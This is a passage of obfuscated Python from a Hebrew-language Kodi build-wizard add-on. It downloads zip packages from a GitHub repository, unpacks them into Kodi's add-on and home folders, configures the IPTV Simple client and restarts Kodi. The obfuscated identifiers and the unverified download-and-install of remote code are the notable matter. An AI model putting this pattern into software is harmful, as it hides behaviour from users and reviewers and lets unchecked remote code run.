        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5682
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5686
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5687
              OO00000O0O0O0OO0O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5689
              OOOO0OO000OOOOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5690
              OO0O0O00OO0O000OO =xbmcgui .DialogProgress ()#line:5691
              OO0O0O00OO0O000OO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:5692
              O0O000OOOO00OOOOO =os .path .join (OOOO0OO000OOOOOO0 ,'isr.zip')#line:5693
              O000O0OO0O000O00O =urllib2 .Request (OO00000O0O0O0OO0O )#line:5694
              O0OOOO00OOO00000O =urllib2 .urlopen (O000O0OO0O000O00O )#line:5695
              OOOO0OO0O0000OO0O =xbmcgui .DialogProgress ()#line:5697
              OOOO0OO0O0000OO0O .create ("Downloading","Downloading "+'iptv')#line:5698
              OOOO0OO0O0000OO0O .update (0 )#line:5699
              OOOO00000OOO0O00O =open (O0O000OOOO00OOOOO ,'wb')#line:5701
              try :#line:5703
                O00000000000OOO00 =O0OOOO00OOO00000O .info ().getheader ('Content-Length').strip ()#line:5704
                OO0OOO0OOOO0OO0O0 =True #line:5705
              except AttributeError :#line:5706
                    OO0OOO0OOOO0OO0O0 =False #line:5707
              if OO0OOO0OOOO0OO0O0 :#line:5709
                    O00000000000OOO00 =int (O00000000000OOO00 )#line:5710
              OO00O00000OOO0O0O =0 #line:5712
              OOO0OO0OOO0OOO000 =time .time ()#line:5713
              while True :#line:5714
                    O0OOOOO0O0OOO0OO0 =O0OOOO00OOO00000O .read (8192 )#line:5715
                    if not O0OOOOO0O0OOO0OO0 :#line:5716
                        sys .stdout .write ('\n')#line:5717
                        break #line:5718
                    OO00O00000OOO0O0O +=len (O0OOOOO0O0OOO0OO0 )#line:5720
                    OOOO00000OOO0O00O .write (O0OOOOO0O0OOO0OO0 )#line:5721
                    if not OO0OOO0OOOO0OO0O0 :#line:5723
                        O00000000000OOO00 =OO00O00000OOO0O0O #line:5724
                    if OOOO0OO0O0000OO0O .iscanceled ():#line:5725
                       OOOO0OO0O0000OO0O .close ()#line:5726
                       try :#line:5727
                        os .remove (O0O000OOOO00OOOOO )#line:5728
                       except :#line:5729
                        pass #line:5730
                       break #line:5731
                    OOOO0O00000000O00 =float (OO00O00000OOO0O0O )/O00000000000OOO00 #line:5732
                    OOOO0O00000000O00 =round (OOOO0O00000000O00 *100 ,2 )#line:5733
                    OO00OO0000O0O0OO0 =OO00O00000OOO0O0O /(1024 *1024 )#line:5734
                    O0OOO0OOO0000OOO0 =O00000000000OOO00 /(1024 *1024 )#line:5735
                    O00OO00O0OOO0OOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OO0000O0O0OO0 ,'teal',O0OOO0OOO0000OOO0 )#line:5736
                    if (time .time ()-OOO0OO0OOO0OOO000 )>0 :#line:5737
                      OOO00O0O0OO00O0OO =OO00O00000OOO0O0O /(time .time ()-OOO0OO0OOO0OOO000 )#line:5738
                      OOO00O0O0OO00O0OO =OOO00O0O0OO00O0OO /1024 #line:5739
                    else :#line:5740
                     OOO00O0O0OO00O0OO =0 #line:5741
                    OO0OOO0O000O00OOO ='KB'#line:5742
                    if OOO00O0O0OO00O0OO >=1024 :#line:5743
                       OOO00O0O0OO00O0OO =OOO00O0O0OO00O0OO /1024 #line:5744
                       OO0OOO0O000O00OOO ='MB'#line:5745
                    if OOO00O0O0OO00O0OO >0 and not OOOO0O00000000O00 ==100 :#line:5746
                        OOOO0OO0OOOOOO000 =(O00000000000OOO00 -OO00O00000OOO0O0O )/OOO00O0O0OO00O0OO #line:5747
                    else :#line:5748
                        OOOO0OO0OOOOOO000 =0 #line:5749
                    O000O0O00OOOOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00O0O0OO00O0OO ,OO0OOO0O000O00OOO )#line:5750
                    OOOO0OO0O0000OO0O .update (int (OOOO0O00000000O00 ),"Downloading "+'iptv',O00OO00O0OOO0OOO0 ,O000O0O00OOOOO00O )#line:5752
              OO0O0O000OO00OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5755
              OOOO00000OOO0O00O .close ()#line:5758
              extract .all (O0O000OOOO00OOOOO ,OO0O0O000OO00OOOO ,OOOO0OO0O0000OO0O )#line:5759
              wiz .kodi17Fix ()#line:5761
              try :#line:5763
                os .remove (O0O000OOOO00OOOOO )#line:5764
              except :#line:5766
                pass #line:5767
              OOOO0OO0O0000OO0O .close ()#line:5768
              xbmc .sleep (5000 )#line:5770
              OOO0O00OO00O0OOOO ='התקנת לקוח טלוויזיה חיה'#line:5772
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O00OO00O0OOOO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5773
              resetkodi ()#line:5774
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5775
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5776
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:5777
              OO00000O0O0O0OO0O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5778
              OOOO0OO000OOOOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5779
              OO0O0O00OO0O000OO =xbmcgui .DialogProgress ()#line:5780
              OO0O0O00OO0O000OO .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:5781
              O0O000OOOO00OOOOO =os .path .join (OOOO0OO000OOOOOO0 ,'isr.zip')#line:5782
              O000O0OO0O000O00O =urllib2 .Request (OO00000O0O0O0OO0O )#line:5783
              O0OOOO00OOO00000O =urllib2 .urlopen (O000O0OO0O000O00O )#line:5784
              OOOO0OO0O0000OO0O =xbmcgui .DialogProgress ()#line:5786
              OOOO0OO0O0000OO0O .create ("Downloading","Downloading "+'iptv')#line:5787
              OOOO0OO0O0000OO0O .update (0 )#line:5788
              OOOO00000OOO0O00O =open (O0O000OOOO00OOOOO ,'wb')#line:5790
              try :#line:5792
                O00000000000OOO00 =O0OOOO00OOO00000O .info ().getheader ('Content-Length').strip ()#line:5793
                OO0OOO0OOOO0OO0O0 =True #line:5794
              except AttributeError :#line:5795
                    OO0OOO0OOOO0OO0O0 =False #line:5796
              if OO0OOO0OOOO0OO0O0 :#line:5798
                    O00000000000OOO00 =int (O00000000000OOO00 )#line:5799
              OO00O00000OOO0O0O =0 #line:5801
              OOO0OO0OOO0OOO000 =time .time ()#line:5802
              while True :#line:5803
                    O0OOOOO0O0OOO0OO0 =O0OOOO00OOO00000O .read (8192 )#line:5804
                    if not O0OOOOO0O0OOO0OO0 :#line:5805
                        sys .stdout .write ('\n')#line:5806
                        break #line:5807
                    OO00O00000OOO0O0O +=len (O0OOOOO0O0OOO0OO0 )#line:5809
                    OOOO00000OOO0O00O .write (O0OOOOO0O0OOO0OO0 )#line:5810
                    if not OO0OOO0OOOO0OO0O0 :#line:5812
                        O00000000000OOO00 =OO00O00000OOO0O0O #line:5813
                    if OOOO0OO0O0000OO0O .iscanceled ():#line:5814
                       OOOO0OO0O0000OO0O .close ()#line:5815
                       try :#line:5816
                        os .remove (O0O000OOOO00OOOOO )#line:5817
                       except :#line:5818
                        pass #line:5819
                       break #line:5820
                    OOOO0O00000000O00 =float (OO00O00000OOO0O0O )/O00000000000OOO00 #line:5821
                    OOOO0O00000000O00 =round (OOOO0O00000000O00 *100 ,2 )#line:5822
                    OO00OO0000O0O0OO0 =OO00O00000OOO0O0O /(1024 *1024 )#line:5823
                    O0OOO0OOO0000OOO0 =O00000000000OOO00 /(1024 *1024 )#line:5824
                    O00OO00O0OOO0OOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OO0000O0O0OO0 ,'teal',O0OOO0OOO0000OOO0 )#line:5825
                    if (time .time ()-OOO0OO0OOO0OOO000 )>0 :#line:5826
                      OOO00O0O0OO00O0OO =OO00O00000OOO0O0O /(time .time ()-OOO0OO0OOO0OOO000 )#line:5827
                      OOO00O0O0OO00O0OO =OOO00O0O0OO00O0OO /1024 #line:5828
                    else :#line:5829
                     OOO00O0O0OO00O0OO =0 #line:5830
                    OO0OOO0O000O00OOO ='KB'#line:5831
                    if OOO00O0O0OO00O0OO >=1024 :#line:5832
                       OOO00O0O0OO00O0OO =OOO00O0O0OO00O0OO /1024 #line:5833
                       OO0OOO0O000O00OOO ='MB'#line:5834
                    if OOO00O0O0OO00O0OO >0 and not OOOO0O00000000O00 ==100 :#line:5835
                        OOOO0OO0OOOOOO000 =(O00000000000OOO00 -OO00O00000OOO0O0O )/OOO00O0O0OO00O0OO #line:5836
                    else :#line:5837
                        OOOO0OO0OOOOOO000 =0 #line:5838
                    O000O0O00OOOOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00O0O0OO00O0OO ,OO0OOO0O000O00OOO )#line:5839
                    OOOO0OO0O0000OO0O .update (int (OOOO0O00000000O00 ),"Downloading "+'iptv',O00OO00O0OOO0OOO0 ,O000O0O00OOOOO00O )#line:5841
              OO0O0O000OO00OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5844
              OOOO00000OOO0O00O .close ()#line:5847
              extract .all (O0O000OOOO00OOOOO ,OO0O0O000OO00OOOO ,OOOO0OO0O0000OO0O )#line:5848
              wiz .kodi17Fix ()#line:5849
              try :#line:5851
                os .remove (O0O000OOOO00OOOOO )#line:5852
              except :#line:5854
                pass #line:5855
              OOOO0OO0O0000OO0O .close ()#line:5856
              xbmc .sleep (5000 )#line:5858
              OOO0O00OO00O0OOOO ='התקנת לקוח טלוויזיה חיה'#line:5860
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O00OO00O0OOOO ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5861
              resetkodi ()#line:5862
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5864
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:5865
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5866
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:5867
def iptvidanplus ():#line:5868
    O00000O0OOO0O0O0O =xbmcaddon .Addon ('plugin.video.idanplus')#line:5869
    O00000O0OOO0O0O0O .setSetting ('useIPTV','true')#line:5870
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:5871
    if KODIV >=17 and KODIV <18 :#line:5874
        O00OO00O0O0000OOO ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:5876
        OO0O0O0O0OO0O000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5877
        O0000OOOO00000OOO =xbmcgui .DialogProgress ()#line:5878
        O0000OOOO00000OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5879
        OOOO0O0OOO00OO0OO =os .path .join (PACKAGES ,'isr.zip')#line:5880
        OOOOOO0O0OOO0O0OO =urllib2 .Request (O00OO00O0O0000OOO )#line:5881
        O0000OO00OO00OOO0 =urllib2 .urlopen (OOOOOO0O0OOO0O0OO )#line:5882
        O00OOOO0OO0O0OOO0 =xbmcgui .DialogProgress ()#line:5884
        O00OOOO0OO0O0OOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5885
        O00OOOO0OO0O0OOO0 .update (0 )#line:5886
        OOOOOOOOOO00000OO =open (OOOO0O0OOO00OO0OO ,'wb')#line:5888
        try :#line:5890
          O000O0O0O0OOOO00O =O0000OO00OO00OOO0 .info ().getheader ('Content-Length').strip ()#line:5891
          O00000O000OOOO00O =True #line:5892
        except AttributeError :#line:5893
              O00000O000OOOO00O =False #line:5894
        if O00000O000OOOO00O :#line:5896
              O000O0O0O0OOOO00O =int (O000O0O0O0OOOO00O )#line:5897
        OOOO00OOOOOO0O00O =0 #line:5899
        O0OO0O00O00OOOOOO =time .time ()#line:5900
        while True :#line:5901
              O00O0OO00O00OOOOO =O0000OO00OO00OOO0 .read (8192 )#line:5902
              if not O00O0OO00O00OOOOO :#line:5903
                  sys .stdout .write ('\n')#line:5904
                  break #line:5905
              OOOO00OOOOOO0O00O +=len (O00O0OO00O00OOOOO )#line:5907
              OOOOOOOOOO00000OO .write (O00O0OO00O00OOOOO )#line:5908
              if not O00000O000OOOO00O :#line:5910
                  O000O0O0O0OOOO00O =OOOO00OOOOOO0O00O #line:5911
              if O00OOOO0OO0O0OOO0 .iscanceled ():#line:5912
                 O00OOOO0OO0O0OOO0 .close ()#line:5913
                 try :#line:5914
                  os .remove (OOOO0O0OOO00OO0OO )#line:5915
                 except :#line:5916
                  pass #line:5917
                 break #line:5918
              O0O000OOO0O0O000O =float (OOOO00OOOOOO0O00O )/O000O0O0O0OOOO00O #line:5919
              O0O000OOO0O0O000O =round (O0O000OOO0O0O000O *100 ,2 )#line:5920
              O0OO0O00OO000O000 =OOOO00OOOOOO0O00O /(1024 *1024 )#line:5921
              OOO00O000OO00O0OO =O000O0O0O0OOOO00O /(1024 *1024 )#line:5922
              O0OOOOOO00OOOOOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO0O00OO000O000 ,'teal',OOO00O000OO00O0OO )#line:5923
              if (time .time ()-O0OO0O00O00OOOOOO )>0 :#line:5924
                OOOO00000OO00000O =OOOO00OOOOOO0O00O /(time .time ()-O0OO0O00O00OOOOOO )#line:5925
                OOOO00000OO00000O =OOOO00000OO00000O /1024 #line:5926
              else :#line:5927
               OOOO00000OO00000O =0 #line:5928
              OO000O0O000O00O0O ='KB'#line:5929
              if OOOO00000OO00000O >=1024 :#line:5930
                 OOOO00000OO00000O =OOOO00000OO00000O /1024 #line:5931
                 OO000O0O000O00O0O ='MB'#line:5932
              if OOOO00000OO00000O >0 and not O0O000OOO0O0O000O ==100 :#line:5933
                  OO0O0O00OO00O000O =(O000O0O0O0OOOO00O -OOOO00OOOOOO0O00O )/OOOO00000OO00000O #line:5934
              else :#line:5935
                  OO0O0O00OO00O000O =0 #line:5936
              OOO00OOO00000OO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO00000OO00000O ,OO000O0O000O00O0O )#line:5937
              O00OOOO0OO0O0OOO0 .update (int (O0O000OOO0O0O000O ),O0OOOOOO00OOOOOO0 ,OOO00OOO00000OO0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5939
        O00O000OO0000O0OO =xbmc .translatePath (os .path .join ('special://home/'))#line:5942
        OOOOOOOOOO00000OO .close ()#line:5945
        extract .all (OOOO0O0OOO00OO0OO ,O00O000OO0000O0OO ,O00OOOO0OO0O0OOO0 )#line:5946
        try :#line:5950
          os .remove (OOOO0O0OOO00OO0OO )#line:5951
        except :#line:5952
          pass #line:5953
        wiz .kodi17Fix ()#line:5954
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:5955
        time .sleep (10 )#line:5956
        OO0OOO00OOO00OOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:5957
        OO0OOO00OOO00OOO0 .setSetting ('epgTimeShift','1.000000')#line:5958
        OO0OOO00OOO00OOO0 .setSetting ('m3uPathType','0')#line:5959
        OO0OOO00OOO00OOO0 .setSetting ('epgPathType','0')#line:5960
        OO0OOO00OOO00OOO0 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:5961
        OO0OOO00OOO00OOO0 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:5962
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:5963
        resetkodi ()#line:5964
    if KODIV >=18 :#line:5967
        iptvkodi18idan ()#line:5969
        wiz .kodi17Fix ()#line:5970
        time .sleep (10 )#line:5972
        OO0OOO00OOO00OOO0 =xbmcaddon .Addon ('pvr.iptvsimple')#line:5973
        OO0OOO00OOO00OOO0 .setSetting ('epgTimeShift','1.000000')#line:5974
        OO0OOO00OOO00OOO0 .setSetting ('m3uPathType','0')#line:5975
        OO0OOO00OOO00OOO0 .setSetting ('epgPathType','0')#line:5976
        OO0OOO00OOO00OOO0 .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:5977
        OO0OOO00OOO00OOO0 .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:5978
        OO0OO0O0O0O0OOO00 ='הגדרת ערוצי עידן פלוס'#line:5979
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0O0O0O0OOO00 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:5980
        resetkodi ()#line:5981
def iptvsimpldown ():#line:5997
    O00OO00O0OOOO0000 =(IPTV18 )#line:5999
    OO0000O00OOO0O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6000
    OOO00OOOO00000O00 =xbmcgui .DialogProgress ()#line:6001
    OOO00OOOO00000O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6002
    O0O000OO0O0O0OO00 =os .path .join (PACKAGES ,'isr.zip')#line:6003
    OO0OOO00O0O0O0O00 =urllib2 .Request (O00OO00O0OOOO0000 )#line:6004
    O00O0OO00O00000OO =urllib2 .urlopen (OO0OOO00O0O0O0O00 )#line:6005
    O00O0O00O0O0OOOO0 =xbmcgui .DialogProgress ()#line:6007
    O00O0O00O0O0OOOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6008
    O00O0O00O0O0OOOO0 .update (0 )#line:6009
    O0OO0000000OO0O00 =open (O0O000OO0O0O0OO00 ,'wb')#line:6011
    try :#line:6013
      OOO0O000OO0O0OO0O =O00O0OO00O00000OO .info ().getheader ('Content-Length').strip ()#line:6014
      O00O0OOOO00OOO0O0 =True #line:6015
    except AttributeError :#line:6016
          O00O0OOOO00OOO0O0 =False #line:6017
    if O00O0OOOO00OOO0O0 :#line:6019
          OOO0O000OO0O0OO0O =int (OOO0O000OO0O0OO0O )#line:6020
    OOO0O0OOO000O0O0O =0 #line:6022
    O00O000OO0OOO00OO =time .time ()#line:6023
    while True :#line:6024
          OOO00O0OOO00OO0OO =O00O0OO00O00000OO .read (8192 )#line:6025
          if not OOO00O0OOO00OO0OO :#line:6026
              sys .stdout .write ('\n')#line:6027
              break #line:6028
          OOO0O0OOO000O0O0O +=len (OOO00O0OOO00OO0OO )#line:6030
          O0OO0000000OO0O00 .write (OOO00O0OOO00OO0OO )#line:6031
          if not O00O0OOOO00OOO0O0 :#line:6033
              OOO0O000OO0O0OO0O =OOO0O0OOO000O0O0O #line:6034
          if O00O0O00O0O0OOOO0 .iscanceled ():#line:6035
             O00O0O00O0O0OOOO0 .close ()#line:6036
             try :#line:6037
              os .remove (O0O000OO0O0O0OO00 )#line:6038
             except :#line:6039
              pass #line:6040
             break #line:6041
          OOOO0000OOOOOO00O =float (OOO0O0OOO000O0O0O )/OOO0O000OO0O0OO0O #line:6042
          OOOO0000OOOOOO00O =round (OOOO0000OOOOOO00O *100 ,2 )#line:6043
          O0O0000O00O00O0OO =OOO0O0OOO000O0O0O /(1024 *1024 )#line:6044
          OO0O00O0OOOOOO0OO =OOO0O000OO0O0OO0O /(1024 *1024 )#line:6045
          O00O00O000000O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0000O00O00O0OO ,'teal',OO0O00O0OOOOOO0OO )#line:6046
          if (time .time ()-O00O000OO0OOO00OO )>0 :#line:6047
            O0OO0OOO0O0000000 =OOO0O0OOO000O0O0O /(time .time ()-O00O000OO0OOO00OO )#line:6048
            O0OO0OOO0O0000000 =O0OO0OOO0O0000000 /1024 #line:6049
          else :#line:6050
           O0OO0OOO0O0000000 =0 #line:6051
          O00OO000000000000 ='KB'#line:6052
          if O0OO0OOO0O0000000 >=1024 :#line:6053
             O0OO0OOO0O0000000 =O0OO0OOO0O0000000 /1024 #line:6054
             O00OO000000000000 ='MB'#line:6055
          if O0OO0OOO0O0000000 >0 and not OOOO0000OOOOOO00O ==100 :#line:6056
              OO0O0O00000OO0OO0 =(OOO0O000OO0O0OO0O -OOO0O0OOO000O0O0O )/O0OO0OOO0O0000000 #line:6057
          else :#line:6058
              OO0O0O00000OO0OO0 =0 #line:6059
          OOOO0O00O0OO000OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0OOO0O0000000 ,O00OO000000000000 )#line:6060
          O00O0O00O0O0OOOO0 .update (int (OOOO0000OOOOOO00O ),O00O00O000000O0OO ,OOOO0O00O0OO000OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6062
    OOOO0O0000OO0O0O0 =xbmc .translatePath (os .path .join ('special://home/'))#line:6065
    O0OO0000000OO0O00 .close ()#line:6068
    extract .all (O0O000OO0O0O0OO00 ,OOOO0O0000OO0O0O0 ,O00O0O00O0O0OOOO0 )#line:6069
    try :#line:6073
      os .remove (O0O000OO0O0O0OO00 )#line:6074
    except :#line:6075
      pass #line:6076
def testnotify ():#line:6077
	O0OOO0O00OO0OOO0O =wiz .workingURL (NOTIFICATION )#line:6078
	if O0OOO0O00OO0OOO0O ==True :#line:6079
		try :#line:6080
			O0O00OOO0O0000O00 ,O0OO0OOOOOO0O0000 =wiz .splitNotify (NOTIFICATION )#line:6081
			if O0O00OOO0O0000O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6082
			if STARTP2 ()=='ok':#line:6083
				notify .notification (O0OO0OOOOOO0O0000 ,True )#line:6084
		except Exception as O0O00OO0OOOO000O0 :#line:6085
			wiz .log ("Error on Notifications Window: %s"%str (O0O00OO0OOOO000O0 ),xbmc .LOGERROR )#line:6086
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6087
def testnotify2 ():#line:6088
	O00O00O000O0O00O0 =wiz .workingURL (NOTIFICATION2 )#line:6089
	if O00O00O000O0O00O0 ==True :#line:6090
		try :#line:6091
			O0000000O0OO0O000 ,O0OO0000OOO0O0000 =wiz .splitNotify (NOTIFICATION2 )#line:6092
			if O0000000O0OO0O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6093
			if STARTP2 ()=='ok':#line:6094
				notify .notification2 (O0OO0000OOO0O0000 ,True )#line:6095
		except Exception as O00O0OOOO00000OO0 :#line:6096
			wiz .log ("Error on Notifications Window: %s"%str (O00O0OOOO00000OO0 ),xbmc .LOGERROR )#line:6097
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6098
def testnotify3 ():#line:6099
	OO00O000000OO0OO0 =wiz .workingURL (NOTIFICATION3 )#line:6100
	if OO00O000000OO0OO0 ==True :#line:6101
		try :#line:6102
			OOOOOOOOOO0OO0OO0 ,OOOO00000OOOOOO0O =wiz .splitNotify (NOTIFICATION3 )#line:6103
			if OOOOOOOOOO0OO0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6104
			if STARTP2 ()=='ok':#line:6105
				notify .notification3 (OOOO00000OOOOOO0O ,True )#line:6106
		except Exception as O00OOOOOOOO00O0O0 :#line:6107
			wiz .log ("Error on Notifications Window: %s"%str (O00OOOOOOOO00O0O0 ),xbmc .LOGERROR )#line:6108
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6109
def wait ():#line:6110
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6111
def infobuild ():#line:6112
	OOOO00O0O00OOO0OO =wiz .workingURL (NOTIFICATION )#line:6113
	if OOOO00O0O00OOO0OO ==True :#line:6114
		try :#line:6115
			O0OO0OO0OOO00OO0O ,OOO000O000OO0OO0O =wiz .splitNotify (NOTIFICATION )#line:6116
			if O0OO0OO0OOO00OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6117
			if STARTP2 ()=='ok':#line:6118
				notify .updateinfo (OOO000O000OO0OO0O ,True )#line:6119
		except Exception as O0O0OO0O0O0OO0OO0 :#line:6120
			wiz .log ("Error on Notifications Window: %s"%str (O0O0OO0O0O0OO0OO0 ),xbmc .LOGERROR )#line:6121
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6122
def servicemanual ():#line:6123
	O00O0O0000000O000 =wiz .workingURL (HELPINFO )#line:6124
	if O00O0O0000000O000 ==True :#line:6125
		try :#line:6126
			OO00O0O0O00OOO000 ,O0OOOO000O0O0O000 =wiz .splitNotify (HELPINFO )#line:6127
			if OO00O0O0O00OOO000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6128
			notify .helpinfo (O0OOOO000O0O0O000 ,True )#line:6129
		except Exception as OO000OO0O00OO00OO :#line:6130
			wiz .log ("Error on Notifications Window: %s"%str (OO000OO0O00OO00OO ),xbmc .LOGERROR )#line:6131
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6132
def testupdate ():#line:6134
	if BUILDNAME =="":#line:6135
		notify .updateWindow ()#line:6136
	else :#line:6137
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6138
def testfirst ():#line:6140
	notify .firstRun ()#line:6141
def testfirstRun ():#line:6143
	notify .firstRunSettings ()#line:6144
def fastinstall ():#line:6147
	notify .firstRuninstall ()#line:6148
def addDir (O0OOOOOO00O0OOOOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6155
	O00000000000O00O0 =sys .argv [0 ]#line:6156
	if not mode ==None :O00000000000O00O0 +="?mode=%s"%urllib .quote_plus (mode )#line:6157
	if not name ==None :O00000000000O00O0 +="&name="+urllib .quote_plus (name )#line:6158
	if not url ==None :O00000000000O00O0 +="&url="+urllib .quote_plus (url )#line:6159
	OOO0OOOOO0O0O0000 =True #line:6160
	if themeit :O0OOOOOO00O0OOOOO =themeit %O0OOOOOO00O0OOOOO #line:6161
	OO0OO000000OOOO0O =xbmcgui .ListItem (O0OOOOOO00O0OOOOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6162
	OO0OO000000OOOO0O .setInfo (type ="Video",infoLabels ={"Title":O0OOOOOO00O0OOOOO ,"Plot":description })#line:6163
	OO0OO000000OOOO0O .setProperty ("Fanart_Image",fanart )#line:6164
	if not menu ==None :OO0OO000000OOOO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:6165
	OOO0OOOOO0O0O0000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00000000000O00O0 ,listitem =OO0OO000000OOOO0O ,isFolder =True )#line:6166
	return OOO0OOOOO0O0O0000 #line:6167
def addFile (OO00000O0OOOO00OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6169
